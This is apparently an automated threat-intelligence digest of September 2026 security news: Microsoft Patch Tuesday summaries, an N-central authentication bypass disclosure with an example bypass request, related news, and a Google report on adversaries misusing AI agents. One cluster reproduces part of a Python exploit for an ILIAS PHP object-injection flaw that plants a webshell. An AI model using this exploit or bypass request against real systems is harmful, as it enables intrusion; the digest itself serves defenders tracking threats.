### Cluster a8443c14f2 — score 36

- Title: Patch Tuesday - September 2026
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-08T21:44:04+00:00
- Link: https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-81963, CVE-2026-85046, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85880, CVE-2026-81963, CVE-2026-85046
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Microsoft is publishing 974 own-product vulnerabilities on September 2026 Patch Tuesday , including 723 vulnerabilities in Windows. Along with Microsoft fixes for 25 non-Microsoft CVEs, that brings the total number of vulnerabilities on the table today to 999. Whether this is the biggest Patch Tuesday ever depends on how we count, but this is by far the most CVEs that Microsoft has ever published in a single day. As Rapid7 noted last month, there is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today. Windows ALPC: zero-day EoP The eternal game of elevation of privilege whack-a-mole between Microsoft and attackers continues. This month, the battle is centered on the Windows Advanced Local Procedure Call (ALPC) mechanism, a kernel capability that facilitates inter-process communication. Microsoft is aware of exploitation in the wild already. Succe
```

#### Full body

```
Back to Blog Exposure Management Patch Tuesday - September 2026 Sep 8, 2026 | Last updated on Sep 8, 2026 | 122 min read Microsoft is publishing 974 own-product vulnerabilities on September 2026 Patch Tuesday , including 723 vulnerabilities in Windows. Along with Microsoft fixes for 25 non-Microsoft CVEs, that brings the total number of vulnerabilities on the table today to 999. Whether this is the biggest Patch Tuesday ever depends on how we count, but this is by far the most CVEs that Microsoft has ever published in a single day. As Rapid7 noted last month, there is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today. Windows ALPC: zero-day EoP The eternal game of elevation of privilege whack-a-mole between Microsoft and attackers continues. This month, the battle is centered on the Windows Advanced Local Procedure Call (ALPC) mechanism, a kernel capability that facilitates inter-process communication. Microsoft is aware of exploitation in the wild already. Successful abuse of the flaw underlying CVE-2026-85880 grants an attacker SYSTEM via a buffer overflow that enables an out-of-bounds write, and as we all know by now, this is exactly what would happen during the first five minutes of a technically accurate horror movie about ransomware. We can infer one silver lining here: since neither Server 2025 nor Windows 11 receives patches for CVE-2026-85880, it is likely that Microsoft’s ongoing efforts to level up memory safety by rewriting critical kernel components in Rust are paying off. Windows Update Stack: zero-day EoP Attackers disappointed by Microsoft’s move towards memory safety improvements for various critical kernel components need not leave empty-handed today. Microsoft is aware of existing exploitation in the wild for CVE-2026-81963 , an elevation of privilege vulnerability in the Windows Update Stack that leads to SYSTEM privileges via improper link resolution. All supported versions of Windows receive a patch, which presumably tightens up controls to prevent the Windows Update Stack from following a malicious link and overwriting a system component with an attacker-controlled imposter. The relatively pedestrian CVSS v3 base score of 7.8 is no reason for less concern, since no serious attacker will bother developing an intricate one-shot RCE when a two-stage attack chain consisting of low-privileged local access coupled with elevation of privilege will achieve the same ultimate goal much more easily. Living on the Edge: browser advisory uncertainty For the second month in a row, Microsoft does not appear to have published any desktop browser security advisories between the start of the month and Patch Tuesday. Microsoft Edge is built on top of Google’s open-source Chromium project, and on September 3, 2026, Google Chrome patched CVE-2026-85046, an exploited-in-the-wild zero-day vulnerability in the V8 JavaScript engine relied upon by both Edge and Chrome. So, is Microsoft Edge falling dangerously behind Google Chrome? Well, maybe. In this specific case, the Edge stable channel did receive a patch a day earlier than Chrome on September 2, 2026, and we know this because the Edge release notes mention it . However, almost a week later, Microsoft still hasn’t published a security advisory for CVE-2026-85046 , and until that URL returns something better than a 404, that will remain true. In short: if you’re patched, you are protected, but if you rely on advisories to know which vulns exist, you could miss this zero-day vulnerability altogether. Only Microsoft knows why this advisory is missing, but there is no reason to suppose that Microsoft is somehow immune to the pressures that come along with the vast increase in vulnerability volume. A patch without an advisory is perhaps marginally better than an advisory without a patch, but keeping track of exposures without reliable adv
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Patch Tuesday - September 2026
  - Published: 2026-09-08T21:44:04+00:00
  - Link: https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
  - Summary: Microsoft is publishing 974 own-product vulnerabilities on September 2026 Patch Tuesday , including 723 vulnerabilities in Windows. Along with Microsoft fixes for 25 non-Microsoft CVEs, that brings the total number of vulnerabilities on the table today to 999. Whether this is the biggest Patch Tuesday ever depends on how we count, but this is by far the most CVEs that Microsoft has ever published in a single day. As Rapid7 noted last month, there is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today. Windows ALPC: zero-day EoP The eternal game of elevation of privilege whack-a-mole between Microsoft and attackers continues. This month, the battle is centered on the Windows Advanced Local Procedure Call (ALPC) mechanism, a kernel capability that facilitates inter-process communication. Microsoft is aware of exploitation in the wild already. Succe

### Cluster 5c940a7bfe — score 31

- Title: [remote] CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-09-11T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52682
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-80428

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- cve_ids: CVE-2026-80428
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- cve_ids: CVE-2026-80428
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE EDB-ID: 52682 CVE: 2026-80428 EDB Verified: Author: DigiProSec Type: remote Exploit: / Platform: Multiple Date: 2026-09-11 Vulnerable App: #!/usr/bin/env python3 # # Exploit Title: ILIAS <= 9.21 / 10.9 / 11.2 - Unauthenticated PHP Object Injection (RCE) # Date: 2026-08-31 # Exploit Author: DigiProSec # Vendor Homepage: https://www.ilias.de # Software Link: https://github.com/ILIAS-eLearning/ILIAS # Version: ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 (fixed in 9.22 / 10.10 / 11.3) # Tested on: Rocky Linux 9, Apache + PHP-FPM 8.2, ILIAS 10.9 (MariaDB 10.11 backend) # CVE: CVE-2026-80428 # # CVE-2026-80428 — Unauthenticated PHP Object Injection via Shibboleth # Injection via Shibboleth back-channel logout endpoint (RCE as web server user) # # Chain: # 1. ltiauth.php (auth-exempt LTI entry point) stores the entire request # parameter array into the session table (ilSession::set on # 'lti13_login_data'). A "\w+|" marker inside a parameter value breaks the # custom session parser, so our raw serialized object is handed to # unserialize() as if it were a session value. # 2. shib_logout.php (auth-exempt Shibboleth back-channel) — a POST with any # non-empty body starts a SoapServer whose LogoutNotification() handler # unserializes EVERY live session row with no class allowlist. # 3. Gadget: GuzzleHttp\Cookie\FileCookieJar (bundled in ILIAS's vendor tree). # __destruct() -> save($this->filename) -> file_put_contents($filename, # json_encode($cookies)). Attacker-chosen path + JSON-embedded PHP = webshell. # # Tested: ILIAS 10.9 on Rocky Linux 9 (Apache + PHP-FPM 8.2, MariaDB backend). # Notes: - v11.x ships a broken shib_logout.php variant (null $DIC) and does # not reach the vulnerable code as packaged; v9/v10 are exploitable. # - The target's docroot disk path is needed for the file write # (--path). Defaults to the standard /var/www/ilias/public. # - If ILIAS was configured with a fixed http path, requests must carry # that hostname (--host-header). # # Usage: python3 CVE-2026-80428.py <target-ip-or-host> [--cmd 'id'] # python3 CVE-2026-80428.py 10.10.10.20 --host-header lms.example --shell # import argparse, http.client, re, secrets, ssl, sys, urllib.parse def s(x): b = x.encode() if isinstance(x, str) else x return b's:' + str(len(b)).encode() + b':"' + b + b'";' def filecookiejar(path: str) -> bytes: php = b'<?php system($_GET[chr(120)]); ?>' # PHP8: bareword index fatals; chr() avoids quotes data = (s('Name') + s('util') + s('Value') + s(php) + s('Domain') + s('ilias') + s('Path') + s('/') + s('Max-Age') + b'N;' + s('Expires') + b'i:1999999999;' + s('Secure') + b'b:0;' + s('Discard') + b'b:0;' + s('HttpOnly') + b'b:0;') setcookie = (b'O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{' + s('\x00GuzzleHttp\\Cookie\\SetCookie\x00data') + b'a:9:{' + data + b'}}') return (b'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{' + s('\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies') + b'a:1:{i:0;' + setcookie + b'}' + s('\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode') + b'b:0;' + s('\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename') + s(path) + s('\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies') + b'b:1;}') SOAP = (b'<?xml version="1.0" encoding="UTF-8"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=' b'"http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:mace:shibboleth:2.0:sp:notify">' b'<SOAP-ENV:Body><ns1:LogoutNotification><SessionID>x</SessionID>' b'</ns1:LogoutNotification></SOAP-ENV:Body></SOAP-ENV:Envelope>') class Target: def __init__(self, host, port, host_header): self.host, self.port = host, port self.hh = host_header or host self.ctx = ssl._create_unverified_context() def req(self, method, path, body=None, ctype=None): conn = (http.client.HTTPSConnection if self.port == 443 else http.client.HTTPConnection)( self.h
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [remote] CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE
  - Published: 2026-09-11T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52682
  - Summary: CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE

### Cluster 2a281139fe — score 31

- Title: CVE-2026-86206, CVE-2026-86207: N-able N-central Authentication Bypass (FIXED)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-08T11:01:27+00:00
- Link: https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-18577, CVE-2026-86206, CVE-2026-86207

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- cve_ids: CVE-2026-18577, CVE-2026-86206, CVE-2026-86207
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-18577
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview While conducting research into a recent N-able N-central authentication bypass vulnerability ( CVE-2026-18577 ), Rapid7 Labs discovered two new vulnerabilities affecting the latest version of N-central. When chained together, these two vulnerabilities allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System administrator account on an affected server. CVE ID Description CWE CVSSv4 CVE-2026-86206 Semicolon/Forwarded access-control bypass CWE-791 6.9 (Medium) CVE-2026-86207 UserTwoFactorLogin authentication bypass CWE-305 7.7 (High) Both CVE-2026-86206 and CVE-2026-86207 have been patched by the vendor via N-central 2026.3 Hotfix 3. Product description N-able N-central is an enterprise-grade Remote Monitoring and Management (RMM) platform designed for Managed Service Providers (MSPs) and IT departments to monitor, manage, and secure complex, large-scale networks from a centralized dashboard. Credit These vulnerabilities were di
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits CVE-2026-86206, CVE-2026-86207: N-able N-central Authentication Bypass (FIXED) Stephen Fewer Sep 8, 2026 | Last updated on Sep 8, 2026 | 9 min read Overview While conducting research into a recent N-able N-central authentication bypass vulnerability ( CVE-2026-18577 ), Rapid7 Labs discovered two new vulnerabilities affecting the latest version of N-central. When chained together, these two vulnerabilities allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System administrator account on an affected server. CVE ID Description CWE CVSSv4 CVE-2026-86206 Semicolon/Forwarded access-control bypass CWE-791 6.9 (Medium) CVE-2026-86207 UserTwoFactorLogin authentication bypass CWE-305 7.7 (High) Both CVE-2026-86206 and CVE-2026-86207 have been patched by the vendor via N-central 2026.3 Hotfix 3. Product description N-able N-central is an enterprise-grade Remote Monitoring and Management (RMM) platform designed for Managed Service Providers (MSPs) and IT departments to monitor, manage, and secure complex, large-scale networks from a centralized dashboard. Credit These vulnerabilities were discovered by Stephen Fewer, Senior Principal Security Researcher at Rapid7 , and are being disclosed in accordance with Rapid7's vulnerability disclosure policy . Technical analysis CVE-2026-86206 N-central exposes its management interface (TCP 8443 by default) through Envoy , an edge proxy. Envoy passes accepted requests to Jetty , the Java web server that hosts N-central's application. The application gives requests from the loopback address (i.e. 127.0.0.1 ) more access than requests from a remote system. This design depends on Envoy, Jetty, and the N-central access filter all agreeing on which application path the client requested and whether the client is really local. The following request can make them disagree about both of these things: POST /dms;/services/ServerUI HTTP/1.1 Forwarded: for="127.0.0.\1" Content-Type: text/xml; charset=utf-8 SOAPAction: "" The semicolon in the URI and backslash in the Forwarded value introduce a discrepancy when processing the request that leads to an access control bypass. Looking at Figure 1 below, we can see an overview of how these two values are processed during an incoming malicious request. Figure 1: Processing a malicious request. The semicolon gets the request past Envoy The Envoy proxy rules come from the n-central-proxy-4.5.6-5 package. In /etc/opt/envoy/lds_intermediate.yaml , shown below (and edited for brevity), the management listener returns HTTP 403 for paths beginning with /dms/services or /internal/dms . A final catch-all rule sends other paths to the DMS application. # /etc/opt/envoy/lds_intermediate.yaml:953 - match: prefix: /internal/dms # response-header boilerplate omitted direct_response: status: 403 body: inline_string: Forbidden. No API access on the UI port. # ... - match: prefix: /dms/services # response-header boilerplate omitted direct_response: status: 403 body: inline_string: Forbidden. No API access on the UI port. # ... # /etc/opt/envoy/lds_intermediate.yaml:1301 # A final catch-all rule... - match: prefix: / route: cluster: dms timeout: seconds: 300 Envoy compares those prefixes with the path it received. The path /dms;/services/ServerUI does not begin with /dms/services , because the next character after /dms is a semicolon. It therefore reaches the catch-all route, passing the request from Envoy to Jetty. Jetty interprets the path differently. The shipped jetty-http-9.4.56.v20240826.jar contains org.eclipse.jetty.http.HttpURI , and org.eclipse.jetty.util.URIUtil . Together, these classes treat text beginning with a semicolon as a path parameter and remove it when producing the decoded path used for servlet dispatch. As a result, Jetty turns /dms;/services/ServerUI into /dms/services/ServerUI . That decoded path then matches the Axis SOAP servlet mapping in /opt/nable/webapps/ROOT/WEB-
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-86206, CVE-2026-86207: N-able N-central Authentication Bypass (FIXED)
  - Published: 2026-09-08T11:01:27+00:00
  - Link: https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
  - Summary: Overview While conducting research into a recent N-able N-central authentication bypass vulnerability ( CVE-2026-18577 ), Rapid7 Labs discovered two new vulnerabilities affecting the latest version of N-central. When chained together, these two vulnerabilities allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System administrator account on an affected server. CVE ID Description CWE CVSSv4 CVE-2026-86206 Semicolon/Forwarded access-control bypass CWE-791 6.9 (Medium) CVE-2026-86207 UserTwoFactorLogin authentication bypass CWE-305 7.7 (High) Both CVE-2026-86206 and CVE-2026-86207 have been patched by the vendor via N-central 2026.3 Hotfix 3. Product description N-able N-central is an enterprise-grade Remote Monitoring and Management (RMM) platform designed for Managed Service Providers (MSPs) and IT departments to monitor, manage, and secure complex, large-scale networks from a centralized dashboard. Credit These vulnerabilities were di

### Cluster dca90fcb42 — score 27

- Title: N-able N-central Pre-Auth RCE Flaw Exploited in the Wild
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T04:27:51+00:00
- Link: https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-86218

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, supply_chain
- affected_industries: government
- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a maximum-severity security flaw impacting N-able N-central to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. The vulnerability in question is CVE-2026-86218 (CVSS score: 10.0), which has been described as a
```

#### Full body

```
N-able N-central Pre-Auth RCE Flaw Exploited in the Wild  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Code Injection The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a maximum-severity security flaw impacting N-able N-central to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. The vulnerability in question is CVE-2026-86218 (CVSS score: 10.0), which has been described as a case of static code injection. It has been patched in N-central 2026.3 Hotfix 4 , released on September 5, 2026. "N-able N-central contains a static code injection vulnerability that could allow for pre-authentication remote code execution," CISA said. The development came shortly after Huntress said it commenced an investigation following the compromise of a customer's fully patched N-central production environment on September 4, 2026. However, it remains unclear if the intrusion involved CVE-2026-86218 or two other vulnerabilities ( CVE-2026-86206 and CVE-2026-86207 ) that were patched by N-able the same day with N-central 2026.3 Hotfix 3. CVE-2026-86206 and CVE-2026-86207 can be chained together to allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System Administrator account on an affected server, per Rapid7's Stephen Fewer , who discovered and reported them. "Due to limited historical logging available directly on the appliance, we cannot definitively confirm which specific exploit the threat actor used to achieve their compromise, nor can we rule out the use of alternative vulnerabilities," Huntress noted . In a separate "urgent" notice sent directly to customers, N-able said CVE-2026-86218 "has been observed being exploited in the wild" and that it's "actively investigating this matter and have taken additional steps to help protect customer environments." It also urged customers to apply the hotfix immediately. Preemptive exposure management firm watchTowr said it has successfully reproduced CVE-2026-86218, adding that the pre-authentication vulnerability enables remote code execution and allows attackers to make changes in N-central that can propagate across all connected systems. "This is precisely why N-central is so strategically valuable to threat actors, especially ransomware gangs," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said. "The product is widely used by MSPs, MSSPs, and large IT organizations to manage entire customer and corporate environments. Compromise N-central, and you gain access to all connected computers and downstream systems. Based on historical events, AI-enabled attackers are unlikely to be far behind." "Organizations running internet-facing N-central instances should prioritize upgrading to a patched release. However, as is now quickly becoming the new normal, patching alone is not enough. Organizations must also review their environment for indicators of compromise and anomalous activity that suggest the vulnerability has already been exploited before patching. Ransomware threat actors have historically exploited this product in past campaigns, and this vulnerability is as severe as it gets." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , Code Injection , N-able , remote code execution , Vulnerability ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: N-able N-central Pre-Auth RCE Flaw Exploited in the Wild
  - Published: 2026-09-09T04:27:51+00:00
  - Link: https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a maximum-severity security flaw impacting N-able N-central to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. The vulnerability in question is CVE-2026-86218 (CVSS score: 10.0), which has been described as a
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: N-able Releases Hotfix for Critical Remote Code Execution Vulnerability
  - Published: 2026-09-07T12:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - Summary: The vulnerability, CVE-2026-86218, was allocated a maximum-severity rating by the software provider itself

### Cluster 486bdc7094 — score 27

- Title: GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-08T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/from-prompting-to-autonomy-the-evolution-of-adversarial-ai/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: UNC6780

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain
- actor_attribution: UNC6780
- affected_industries: government, healthcare
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage, active_exploitation
- actor_attribution: UNC6780
- affected_industries: healthcare, government
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and c
```

#### Full body

```
Threat Intelligence GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI September 8, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and co-opt victim cloud environments to sustain unauthorized AI workloads. This shift underscores that enterprise AI assets—from model weights to cloud compute quotas—are high-value targets for espionage, extortion, and resource theft. Key Q2 2026 trends include: Expanding Software Supply Chain Risks: The integration of AI-assisted coding tools and open source software has accelerated software development cycles but also increased operational risks, with threat actors actively targeting developers, AI coding assistants, and LLM security scanning tools. Targeting Proprietary AI IP: GTIG observed increasing instances of adversaries targeting proprietary AI models, code, prompts, and research across sectors including healthcare, government, and media. Shift Toward Agentic AI and Automation: Adversaries are deploying multi-agent frameworks that autonomously manage scanning pipelines, resolve operational errors, and execute credential harvesting at scale. Multi-Stage Lifecycle Augmentation: State-sponsored and cyber crime groups continue to use AI capabilities as force multipliers across the attack lifecycle—from target reconnaissance and social engineering lure creation to custom malware obfuscation and post-exploitation troubleshooting. They are also experimenting with scaling information operations (IO) campaigns. Illicit Account Procurement & LLMJacking: To circumvent access costs, adversaries are stealing developer credentials, purchasing compromised AI platform accounts, and hijacking enterprise cloud infrastructure to run unauthorized high-performance compute workloads. Grounded in telemetry from frontline Mandiant incident response engagements, global threat actor tracking, and live platform defenses, this report details how state-sponsored espionage groups, financially motivated cyber criminals, and information operations (IO) threat actors are operationalizing AI tools in the wild. At Google, we are committed to developing AI boldly and responsibly. Our multifaceted defense strategy integrates proactive model-level safeguards, specialized threat intelligence, and targeted containment protocols to protect our customers and infrastructure. We continuously harden our models against misuse, mitigate malicious activity through proactive disruption of bad actor projects and accounts, and use our autonomous Google AI Threat Defense architecture to operationalize security across enterprise environments. AI-assisted coding pipelines increase open source supply chain risk As discussed in our May report , with organizations continuing to integrate various types of LLMs into production environments, the AI software ecosystem has become a primary target for exploitation. AI-assisted coding has led to
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI
  - Published: 2026-09-08T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/from-prompting-to-autonomy-the-evolution-of-adversarial-ai/
  - Summary: Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and c
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI
  - Published: 2026-09-08T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/from-prompting-to-autonomy-the-evolution-of-adversarial-ai/
  - Summary: Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and c

### Cluster 19d1519629 — score 25

- Title: September 2026 Microsoft Patch Tuesday, (Tue, Sep 8th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-08T19:20:30+00:00
- Link: https://isc.sans.edu/diary/rss/33320
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
This month, Microsoft released patches for a record-breaking 973 vulnerabilities, including 113 rated critical. It is by far the largest Patch Tuesday to date, well ahead of the previous high of 664 set in July 2026. Two vulnerabilities are listed as exploited in the wild, while none were publicly disclosed before Patch Tuesday. Notable fixes include Windows privilege escalation and critical RCEs in Skype for Business, MSMQ and RRAS.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: September 2026 Microsoft Patch Tuesday, (Tue, Sep 8th)
  - Published: 2026-09-08T19:20:30+00:00
  - Link: https://isc.sans.edu/diary/rss/33320
  - Summary: This month, Microsoft released patches for a record-breaking 973 vulnerabilities, including 113 rated critical. It is by far the largest Patch Tuesday to date, well ahead of the previous high of 664 set in July 2026. Two vulnerabilities are listed as exploited in the wild, while none were publicly disclosed before Patch Tuesday. Notable fixes include Windows privilege escalation and critical RCEs in Skype for Business, MSMQ and RRAS.

### Cluster 1dc5542a11 — score 24

- Title: Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit Released
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T11:20:14+00:00
- Link: https://thehackernews.com/2026/09/telerik-ui-padding-oracle-bug-chained.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

